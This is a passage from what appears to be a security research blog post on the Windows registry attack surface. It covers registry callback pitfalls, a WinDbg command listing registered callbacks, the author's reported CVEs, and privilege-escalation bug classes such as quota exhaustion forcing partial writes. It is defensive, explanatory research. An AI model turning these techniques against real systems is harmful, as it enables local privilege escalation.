deterministically fail by creating and operating on a key with a path length exceeding 65535 bytes (the maximum length of a string represented by the UNICODE_STRING structure).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This can be achieved using the key renaming trick described in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451475&quot;&gt;CVE-2022-37990&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and results in the CmCallbackGetKeyObjectID(Ex) function returning the STATUS_INSUFFICIENT_RESOURCES error code.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is problematic because the documentation for this function does not mention this error code, and there is no way to defend against it from the callback&amp;#39;s perspective.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only options are to avoid relying on retrieving the full key path altogether, or to implement a defensive fallback plan if this operation fails.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Logical bugs arising from attempts to block access to certain registry keys by path, but neglecting the key rename operation, which can change the key&amp;#39;s name dynamically and bypass potential filtering logic in the handling of the open/create operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Notably, it&amp;#39;s difficult to blame developers for such mistakes, as even the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/handling-notifications&quot;&gt;official documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;discourages handling NtRenameKey operations, citing its high complexity&lt;/span&gt;&lt;span&gt;&amp;nbsp;(quote: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;&amp;quot;Several registry system calls are not documented because they are rarely used [...]&amp;quot;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As we can see, developers using these types of callbacks can fall into many traps&lt;/span&gt;&lt;span&gt;, and t&lt;/span&gt;&lt;span&gt;he probability of introducing a bug increases with the complexity of the callback&amp;#39;s logic.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As a security researcher&lt;/span&gt;&lt;span&gt;, there are two approaches to enumerating this attack surface to find vulnerable callbacks: static and dynamic.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The static approach involves searching the file system (especially C:\Windows\system32\drivers) for the &amp;quot;CmRegisterCallback&amp;quot; string, as every driver that registers a callback must refer to this function or its &amp;quot;Ex&amp;quot; equivalent. As for the dynamic approach, the descriptors of all callbacks in the system are linked together in a doubly-linked list that begins in the global nt!CallbackListHead object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Although the structure of these descriptors is undocumented, my analysis indicates that the pointer to the callback function is located at offset 0x28 in Windows 11.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, all callbacks registered in the system at a given moment can be listed using the following WinDbg command:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;!list&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;&amp;quot;dqs&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;@$extret+0x28&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;L1&amp;quot;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;CallbackListHead&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`c42f6cd8&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`c42f6cd0&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;nt!CmpPreloadedHivesList&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;ffffdc88`d377e418&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`56a48df0&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;WdFilter!MpRegCallback&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;ffffdc88`d8610b38&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`59747410&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;applockerfltr!SmpRegistryCallback&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;ffffdc88`d363e118&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`57a05dd0&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;UCPD+0x5dd0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;ffffdc88`ed11d788&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`c3c2ba50&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;nt!VrpRegistryCallback&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;ffffdc88`d860c758&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;fffff801`597510c0&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;bfs!BfsRegistryCallback&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As shown, even on a clean Windows 11 system, the operating system and its drivers register a substantial number of callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the listing above, the first line of output can be ignored, as it refers to the nt!CallbackListHead object, which is the beginning of the list and not a real callback descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The remaining functions are associated with the following modules:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_v2df8br1ncnr-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;WdFilter!MpRegCallback:&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&amp;nbsp;a callback registered by Windows Defender, the default antivirus engine running on Windows.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;applockerfltr!SmpRegistryCallback:&lt;/span&gt;&lt;span&gt;&amp;nbsp;a &lt;/span&gt;&lt;span&gt;callback registered by the Smartlocker Filter Driver, which is one of the drivers that implement the AppLocker/SmartLocker functionality at the kernel level.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;UCPD+0x5dd0:&lt;/span&gt;&lt;span&gt;&amp;nbsp;a &lt;/span&gt;&lt;span&gt;callback associated with the UCPD.sys driver, which expands to &amp;quot;User Choice Protection Driver&amp;quot;. This is a module that prevents third-party software from modifying the default application settings for certain file types and protocols, such as web browsers and PDF readers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As &lt;/span&gt;&lt;span&gt;we &lt;/span&gt;&lt;span&gt;can infer from the format of this symbol and its unresolved name, Microsoft does not currently provide PDB debug symbols for &lt;/span&gt;&lt;span&gt;the executable image, but some information online indicates that &lt;/span&gt;&lt;span&gt;such symbols were once available for older builds of the driver.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;nt!VrpRegistryCallback:&lt;/span&gt;&lt;span&gt;&amp;nbsp;a callback implemented by the VRegDriver, which is part of the core Windows kernel executable image, ntoskrnl.exe.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It plays a crucial role in the system, as it is responsible for redirecting key references to their counterparts within &lt;/span&gt;&lt;span&gt;differencing&lt;/span&gt;&lt;span&gt;&amp;nbsp;hives for containerized processes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is likely the most interesting and complex callback registered by default in Windows.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;bfs!BfsRegistryCallback:&lt;/span&gt;&lt;span&gt;&amp;nbsp;the callback is a component of the Brokering File System driver.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It is&lt;/span&gt;&lt;span&gt;&amp;nbsp;primarily responsible for supporting secure file access for applications running in an isolated environment (AppContainers).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, it also has a relatively simple registry callback that supports key opening/creation operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is not entirely clear why the functionality wasn&amp;#39;t simply incorporated into the VrpRegistryCallback, which serves a very similar purpose.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In&lt;/span&gt;&lt;span&gt;&amp;nbsp;my research, I primarily focused on reviewing the callback invocations in individual registry operations (specifically calls to the CmpCallCallBacksEx function), and &lt;/span&gt;&lt;span&gt;on &lt;/span&gt;&lt;span&gt;the correctness of the VrpRegistryCallback function implementation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As a result,&lt;/span&gt;&lt;span&gt;&amp;nbsp;I discovered&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451607&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451607&quot;&gt;CVE-2023-38141&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the former area&lt;/span&gt;&lt;span&gt;, and three further bugs in the VRegDriver (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451608&quot;&gt;CVE-2023-38140&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451609&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451609&quot;&gt;CVE-2023-36803&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451611&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451611&quot;&gt;CVE-2023-36576&lt;/a&gt;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These reports serve as a very good example of the many types of problems that can occur in registry callbacks.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.c48bvbq94jww&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Privileged registry clients: programs and drivers&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The final attack &lt;/span&gt;&lt;span&gt;target&lt;/span&gt;&lt;span&gt;&amp;nbsp;related to the registry are the highly privileged users of this interface, that is, user-mode processes running with administrator/system rights, and kernel drivers that operate on the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he registry is a shared resource by design, and apart from app hives mounted in the special \Registry\A key, every program in the system can refer to any active key as long as it has the appropriate permissions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And for a malicious user, this means that they can try to exploit weaknesses exhibited by other processes when interacting with the registry, and secondly, they can try to actively interfere with them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I can personally imagine two main types of issues related to incorrect use of the registry, and both of them are &lt;/span&gt;&lt;span&gt;qu&lt;/span&gt;&lt;span&gt;ite high-level by nature.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;The first&lt;/span&gt;&lt;span&gt;&amp;nbsp;concern is related to the fact that the registry, as a part of the NT Object Manager model, undergoes standard access control through security access checks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each registry key is mandatorily assigned a specific security descriptor.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, as the name implies, it is crucial for system security that each key&amp;#39;s descriptor has the minimum permissions required for proper functionality, while aligning with the author&amp;#39;s intended security model for the application.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;From a technical perspective, a specific security descriptor for a given key can be set either during its creation through the lpSecurityAttributes argument of &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyExW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or separately by calling the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeysecurity&quot;&gt;RegSetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API. If no descriptor is explicitly set, the key assumes a default descriptor based largely on the security settings of its parent key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This model makes sense from a practical standpoint.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It allows most applications to avoid dealing with the complexities of custom security descriptors, while still maintaining a reasonable level of security, as high-level keys in Windows typically have well-configured security settings.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consider the well-known HKLM\Software tree, where Win32 applications have stored their global settings for many years.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The assumption is that ordinary users have read access to the global configuration within that tree, but only administrators can write to it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If an installer or application creates a new subkey under HKLM\Software without explicitly setting a descriptor, it inherits the default security properties, which is sufficient in most cases.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;However, certain situations require extra care to properly secure registry keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, if an application stores highly sensitive data (e.g., user passwords) in the registry, it is important to ensure that both read and write permissions are restricted to the smallest possible group of users (e.g., administrators only).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, when assigning custom security descriptors to keys in global system hives, you should exercise caution to avoid inadvertently granting write permissions to all system users.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Furthermore, if a user has KEY_CREATE_LINK access to a global key used by higher-privileged processes, they can create a symbolic link within it, potentially resulting in a &amp;quot;confused deputy&amp;quot; problem and the ability to create registry keys under any path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In summary, for developers creating high-privilege code on Windows and utilizing the registry, it is essential to carefully handle the security descriptors of the keys they create and operate on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;From a security researcher&amp;#39;s perspective, it could be useful to develop tooling to list all keys that allow specific access types to particular groups in the system and run it periodically on different Windows versions and configurations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This approach can lead to some very easy bug discoveries, as it doesn&amp;#39;t require any time spent on reverse engineering or code auditing.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c26&quot;&gt;The second&lt;/span&gt;&lt;span&gt;&amp;nbsp;type of issue is more subtle and arises because a single &amp;quot;configuration unit&amp;quot; in the registry sometimes consists of multiple elements (keys, values) and must be modified atomically to prevent an inconsistent state and potential vulnerabilities.&lt;/span&gt;&lt;span&gt;&amp;nbsp; &lt;/span&gt;&lt;span&gt;For such cases, there is support for transactions in the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If a given process manages a configuration that is critical to system security and in which different elements must always be consistent with each other, then making use of the Transacted Registry (TxR) is practically mandatory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A significantly worse, though somewhat acceptable solution may be to implement a custom rollback logic, i.e., in the event of a failure of some individual operation, manually reversing the changes that have been applied so far.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The worst case scenario is when a privileged program does not realize the seriousness of introducing partial changes to the registry, and implements its logic in a way typical of using the API in a best-effort manner, i.e.: calling Win32 functions as long as they succeed, and when any of them returns an error, then simply passing it up to the caller without any additional cleanup.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Let&amp;#39;s consider this bug class &lt;/span&gt;&lt;span&gt;on the&lt;/span&gt;&lt;span&gt;&amp;nbsp;example of a hypothetical service that, through some local inter-process communication interface, allows users to register applications for startup.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It creates a key structure under the HKLM\Software\CustomAutostart\&amp;lt;Application Name&amp;gt; path, and for each such key it stores two values: the command line to run during system startup (&amp;quot;CommandLine&amp;quot;), and the username with whose privileges to run it (&amp;quot;UserName&amp;quot;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If the username value does not exist, it implicitly assumes that the program should start with system rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Of course, the example service intends to be secure, so it only allows setting the username to the one corresponding to the security token of the requesting process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Operations on the registry &lt;/span&gt;&lt;span&gt;take place &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;in the following order:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_ho9g9u9fgt2w-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Create a new key named HKLM\Software\CustomAutostart\&amp;lt;Application Name&amp;gt;,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Set the &amp;quot;CommandLine&amp;quot; value to the string provided by the client,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Set the &amp;quot;UserName&amp;quot; value to the string provided by the client.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The issue with this logic is that it&amp;#39;s not transactional&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; i&lt;/span&gt;&lt;span&gt;f an error occurs, the execution simply aborts, leaving the partial state behind.&lt;/span&gt;&lt;span&gt;&amp;nbsp;For example, if&lt;/span&gt;&lt;span&gt;&amp;nbsp;operation #3 fails for any reason, an entry will be added to the autostart indicating that a controlled path should be launched with system rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This directly leads to privilege escalation and was certainly not the developer&amp;#39;s intention.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One might wonder why any of these operations would fail, especially in a way controlled by an attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The answer is simple and was explained in the &amp;quot;Susceptibility to mishandling OOM conditions&amp;quot; section.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A local attacker has at least two ways of influencing the success or failure of registry operations in the system: by filling the space of the hive they want to attack (if they have write access to at least one of its keys) or by occupying the global registry quota in memory, represented by the global nt!CmpGlobalQuota variable.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Unfortunately, finding such vulnerabilities is more complicated than simply scanning the entire registry for overly permissive security descriptors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It 